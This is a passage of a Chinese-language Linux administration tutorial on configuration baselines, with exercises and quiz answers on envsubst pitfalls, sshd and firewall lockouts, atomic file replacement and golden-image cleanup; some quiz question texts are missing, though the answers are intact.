>   ★★★★ 過期未清的例外，在資安稽核上會被當成「基準未落實」。
> - ★★★ 漂移報告本身含有設定內容，`/var/log/baseline-drift.log` 權限設 `0600 root:root`，
>   不要送進所有人都看得到的聊天群組。

> [!question]- 練習 1：找出你自己機房的三類差異
> **題目**：挑兩台同角色的現役機器，抓 `/etc` 回來 diff，把差異分成三類，
> 並各舉一個實例說明你的判斷依據。
>
> **參考解答**：
>
> ```bash
> mkdir -p ~/etcdiff/{a,b}
> sudo rsync -a --exclude='ssh/ssh_host_*' --exclude='shadow*' --exclude='*.key' \
>   root@10.20.30.41:/etc/ ~/etcdiff/a/
> sudo rsync -a --exclude='ssh/ssh_host_*' --exclude='shadow*' --exclude='*.key' \
>   root@10.20.30.42:/etc/ ~/etcdiff/b/
> diff -r -q ~/etcdiff/a ~/etcdiff/b | grep -v -E 'machine-id|hostname|hosts|blkid|adjtime'
> ```
>
> 判斷示例：
> - **該變成變數**：`/etc/hosts` 裡的自身 IP → 抽成 `BASELINE_HOST_IP`（或乾脆不納管）。
> - **該變成角色／環境差異**：只有 db 那台有 `sysctl` 的 `vm.swappiness=1`
>   → 進 `role-db.env`，因為那是資料庫角色的合理需求。
> - **★★★★ 這是漂移**：只有一台的 `sshd_config.d` 有 `99-debug.conf`，
>   問不出原因也沒有變更單 → 刪掉，並列進 `docs/CHANGELOG.md`。
>
> ★★★ 重點不是差異數量，而是**每一條你都給得出歸類與理由**。給不出來的那幾條，
> 就是你機房裡真正的風險。

> [!question]- 練習 2：故意踩一次 envsubst 的兩個坑
> **題目**：寫一份含 `$remote_addr` 與一個未定義變數的範本，分別用裸跑與白名單 render，
> 觀察產出與退出碼，並說明兩者的後果差在哪。
>
> **參考解答**：
>
> ```bash
> cat > /tmp/p2.tpl <<'EOF'
> log_format main '$remote_addr $status';
> Port ${BASELINE_PORT_TYPO}
> Server ${BASELINE_NTP1}
> EOF
> export BASELINE_NTP1=tock.stdtime.gov.tw
> echo "--- 裸跑 ---"; envsubst < /tmp/p2.tpl; echo "rc=$?"
> echo "--- 白名單 ---"; envsubst '${BASELINE_NTP1} ${BASELINE_PORT_TYPO}' < /tmp/p2.tpl; echo "rc=$?"
> ```
>
> 裸跑輸出：`log_format main ' ';` ← ★★★★★ `$remote_addr` 與 `$status` 都不見了，
> 這份 nginx 設定語法合法，但日誌會變成空白，事後查不到任何來源 IP。
>
> 白名單輸出：`log_format main '$remote_addr $status';` 保留，
> 但 `Port ` 仍是空的，**且兩次的 `rc` 都是 0**。
>
> ★★★★★ 結論：白名單解決坑①，**解決不了坑②**。
> 必填檢查（`: "${BASELINE_PORT_TYPO:?}"`）與產出空值掃描是兩道獨立的防線，缺一不可。

「機器上的才是最新現況，所以應該把機器的內容抄回 repo」——這個判斷對嗎？為什麼？

Q2. 以下這行有什麼問題？會產出什麼？
`envsubst < /srv/baseline/templates/nginx-log.conf.tpl > /etc/nginx/conf.d/log.conf`

`BASELINE_UFW_ALLOW="80/tcp 443/tcp"`。web 角色的機器套用後會發生什麼事？

Q5. 為什麼範本檔頭**不能**放 `# generated at 2026-08-28 06:00:03`？

Q6. 直接 `mv /run/baseline-staging/chrony.conf /etc/chrony/chrony.conf` 有什麼風險？
正確做法是什麼？

Q7. 這段程式碼在防什麼坑？`: "${BASELINE_SSH_PORT:?未定義}"`
沒有它的話，最糟的產出是什麼？

Q8. 你在 Ubuntu 24.04 上改了範本的 `Port`，套用後 `sshd -T | grep port` 顯示 2222，
但 `ss -lntp` 顯示還在聽 22。發生什麼事？

Q9. 每天 06:00 的 timer 應該跑 `--check` 還是 `--apply`？如果主管要求「自動修復」，
你怎麼設計才不會一次打壞 40 台？

Q10. 封裝 golden image 前忘了清 `/etc/machine-id` 與 `/etc/ssh/ssh_host_*`，
各會造成什麼症狀？哪一個是資安問題？

> [!question]- 測驗答案
>
> **Q1. 不對，這是把真值來源交還給機器。**
> ★★★★★ 範本化的前提是「repo 是唯一真值」。看到差異的正確流程是先**判斷這個差異是什麼**：
> - 有變更單、且是合理的單機需求 → 補進 `vars/host-*.env`（含原因/核准/到期），再重新 render。
> - 沒有變更單 → 這是漂移，走三類處置（sshd 屬第二類：先告警、人工確認、單台套用）。
>
> 「機器抄回 repo」聽起來很務實，但它會讓 repo 變成現況的**倒影**而不是**基準** ——
> 三個月後每一台的內容都被抄回去過一輪，你就再也分不出哪些是刻意設定、哪些是誰手滑。
> ★★★★ 唯一例外是**初次導入**時的第一輪整理（見〈差異參數怎麼抽出來〉），
> 那一輪本來就是在建立基準，之後就不能再這樣做。
> 對應段落：〈真值來源只能有一個〉、〈漂移不是都要自動修〉。
>
> **Q2. 裸跑 envsubst，會把 nginx 的所有 `$變數` 吃成空字串。**
> ★★★★★ 產出會是 `log_format main ' ';` 這種東西 —— `$remote_addr`、`$status`、
> `$http_user_agent` 全部消失。語法完全合法，`nginx -t` 會過，服務正常啟動，
> 但**日誌從此不記錄來源 IP**，等到資安事件要追人時才會發現。
>
> ★★★★ 正確寫法：
> ```bash
> WL=$(compgen -v | grep '^BASELINE_' | sed 's/^/${/; s/$/}/' | tr '\n' ' ')
> envsubst "$WL" < tpl > out
> ```
> ★★★ 附帶一提，`$1`、`${1}` 這種**不符合變數命名規則**的不會被動到，
> 所以「我測過 `$1` 沒問題」不能證明範本安全。
> 對應段落：〈envsubst 的三個坑〉坑①。
>
> **Q3. `22/tcp` 會消失，套用後 SSH 連不進去。**
> ★★★★ 四層覆寫是**整個取代**不是合併：`role-web.env` 載入在後，
> `BASELINE_UFW_ALLOW` 的最終值就是 `"80/tcp 443/tcp"`，
> 腳本迴圈只會 `ufw allow 80/tcp` 與 `443/tcp`。
>
> ```bash
> sudo /usr/local/sbin/baseline-render --dump-vars | grep UFW
> # BASELINE_UFW_ALLOW = 80/tcp 443/tcp      ← 少了 22/tcp
> ```
> ★★★★ 解法：角色層**整串重抄** `"22/tcp 80/tcp 443/tcp"`。
> 這條坑之所以致命，是因為它在 `--check` 的 diff 裡看起來只是「多了兩條規則」，
> 少掉的那一條要看最終值才發現。
> 對應段落：〈合併規則：後層是整個取代〉。
>
> **Q4. 不代表。`sshd -t` 只驗語法，不驗語意。**
> ★★★★★ 兩個反例：
> - `AllowGroups opsadm`（正確是 `opsadmin`）：群組名是自由字串，sshd 不會去比對
>   `/etc/group`，語法完全正確，結果是**沒有任何人符合允許清單**，全員被拒。
> - `Port 2222` 但防火牆只開 22：sshd 不管防火牆，測試一定過，套用後 SSH 直接不通。
>
> ★★★★★ 所以套用 sshd 的鐵則是：**留一條既有 session 不關 → 套用 → 另開新視窗驗證成功 →
> 才關舊 session**。並用 `sshd -T | grep allowgroups` 對照 `getent group opsadmin` 事前檢查。
> 對應段落：〈sshd：`sshd -t` 過了也可能鎖門〉。
>
> **Q5. 因為它會讓每天的漂移偵測都報「有差異」。**
> ★★★★ 漂移偵測的做法是「重新 render → 與線上檔 diff」。
> 時間戳每次 render 都不同 → 每台每天都有一行差異 → 報告永遠不是空的。
>
> 真正的代價不是那一行 diff，是**人的行為**：三天後所有人開始跳過這個報告，
> 一週後真正的漂移（有人改了 `PermitRootLogin`）出現時，沒有人會注意到。
> ★★★★ 檔頭應該只放 `BASELINE_VERSION` 這種**跟基準版本綁定**的值 ——
> 這樣某台停在舊版本時，diff 第一行就會告訴你，那是有用的訊號。
> 對應段落：〈範本長什麼樣〉的 danger callout。
>
> **Q6. 風險是「跨檔案系統的 mv 不是原子操作」。**
> ★★★★ `/run` 是 tmpfs、`/etc` 在根分割，兩者不同 fs。
> 跨 fs 的 `mv` 實際是「複製 + 刪除來源」，複製過程中該路徑存在一份**不完整的檔案**。
> 若此時 chronyd reload、logrotate 執行或監控讀取，就會讀到半份設定。
>
> ★★★★ 正確做法：
> ```bash
> install -o root -g root -m 0644 /run/baseline-staging/chrony.conf \
>   /etc/.baseline-tmp/chrony.conf.new      # 先到與 /etc 同 fs 的暫存區
> mv -f /etc/.baseline-tmp/chrony.conf.new /etc/chrony/chrony.conf   # rename(2)，原子
> ```
> ★★★★★ 更糟的是 `cat tpl > /etc/chrony/chrony.conf`：`>` 會先清空目標，
> 寫到一半失敗就把原檔也毀了，連回滾的對象都沒了。
> 對應段落：〈原子式套用與自動回滾〉。
>
> **Q7. 防「未定義變數被 render 成空字串」這個坑。**
> ★★★★★ `envsubst` 遇到白名單內但未定義的變數，會換成空字串，**退出碼還是 0**，
> 沒有任何警告。`: "${VAR:?訊息}"` 搭配 `set -u` 會讓腳本在 render 之前就中止：
> ```text
> baseline-render: line 62: BASELINE_SSH_PORT: 未定義，請檢查 vars/global.env
> ```
> 沒有它的最糟產出是**語法合法、語意全錯**的檔，例如 journald 的 `SystemMaxUse=`：
> 這行完全合法，意思是「用預設值」，於是你以為限制了 2G，實際上日誌可以吃到磁碟滿。
> ★★★★ 第二道防線是 render 後掃描空值行（`grep -nE '=[[:space:]]*$'`），兩道都要有。
> 對應段落：〈envsubst 的三個坑〉坑②。
>
> **Q8. Ubuntu 24.04 的 SSH 是 socket 活化，埠由 systemd 產生的 socket 決定。**
> ★★★★★ `sshd -T` 讀的是設定檔，所以顯示 2222；但實際 listen 的是 `ssh.socket`，
> 它的埠由一支 systemd generator 從設定檔產生 —— 沒有 `daemon-reload` 就不會重新產生。
>
> ```bash
> systemctl is-enabled ssh.socket        # enabled → 確認是 socket 活化
> sudo systemctl daemon-reload           # ★★★★★ 少這行埠永遠不會變
> sudo systemctl restart ssh.socket
> ss -lntp | grep :2222
> ```
> ★★★ 好消息是 socket 活化下每條連線是獨立 `sshd` 實例，
> `restart ssh.socket` 不會踢掉現有 session；但新連線會立刻套用，
> 所以「留一條舊 session」的鐵則依然要遵守。
> ★★ RHEL 9 預設不是 socket 活化，`systemctl reload sshd` 即可。
> 對應段落：〈sshd：`sshd -t` 過了也可能鎖門〉的 danger callout。
>
> **Q9. 排程只跑 `--check`。**
> ★★★★★ 理由：`--apply` 在排程裡執行 = 一個打錯字的 commit 會在 06:00 同時打 40 台，
> 而且如果錯的是 sshd 或防火牆，你**連不進去任何一台**去修。
>
> ★★★★ 要滿足「自動修復」的要求，這樣設計：
> - 排程 `--check` 出報告 + `logger` 送告警（退出碼 2 給監控用）。
> - 自動回填**只開放第一類**：安全基準且不影響連線的項目（`sysctl`、`issue.net`、檔案權限）。
> - 第二類（sshd、防火牆、服務）一律人工：先在 tst 驗 → `--apply --file X --limit 一台` →
>   驗證 → 才擴大。
> - 對主管的說法：「自動偵測 + 自動告警是每天跑；自動修復限定在不會斷線的項目，
>   其餘走變更單」—— 這同時滿足稽核與可用性。
> 對應段落：〈安全性注意事項〉的第二個 danger、〈漂移三類處置〉。
>
> **Q10. 兩個症狀，其中 SSH host key 是資安問題。**
> ★★★★ `machine-id` 沒清（可用性問題）：
> - journald 的 persistent 目錄以 machine-id 命名，集中收送時多台日誌混在一起，
>   查事件時分不出是哪台。
> - DHCP 用它產生 client identifier → 多台互搶同一個租約 →
>   症狀是「機器隨機掉線、IP 互換」，而你會誤以為是交換器或網路卡壞掉。
>
> ★★★★★ `ssh_host_*` 沒清（**資安問題**）：全機關機器的 SSH 指紋一模一樣，
> 使用者對 A 機器建立的 `known_hosts` 連到 B 也不會警告 ——
> 這代表**中間人把流量導向假伺服器時，客戶端同樣不會警告**，
> SSH 賴以防中間人的機制整個失效。任何一台被入侵、主機私鑰外洩，等於全機關失守。
>
> ★★★ 清除方式見〈封裝映像前必須清掉的東西〉，重點是**清完立刻關機，不要再開機**，
> 因為一開機 machine-id 與 host key 就又生成了。
> 對應段落：〈映像與範本的分工〉。
